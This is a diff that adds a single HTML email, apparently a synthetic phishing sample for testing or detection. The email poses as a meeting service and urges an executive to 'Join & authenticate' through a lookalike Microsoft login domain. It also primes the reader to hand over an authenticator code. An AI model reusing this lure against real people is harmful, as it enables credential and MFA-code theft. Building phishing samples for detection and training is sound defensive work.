@@ -1,0 +1,9 @@
+From: =?utf-8?B?TWVldGluZyBTZXJ2aWNlcw==?= <join@meet-secure-relay.example>
+To: exec@corp.internal
+Date: Tue, 22 Sep 2026 10:19:00 +0800
+Message-ID: <0009-b29@synth.example>
+Subject: Board sync starting soon (sign-in required)
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>The board sync starts in 15 minutes.</p><p>To comply with the new security policy, please sign in through your corporate account:</p><a href='https://login-microsoftonline.vsecure-gw.example/authorize' style='background:#0067b8;color:#fff;padding:10px 26px;text-decoration:none'>Join & authenticate</a><p style='font-size:11px'>You may be asked for your authenticator code - this is expected.</p></body></html>
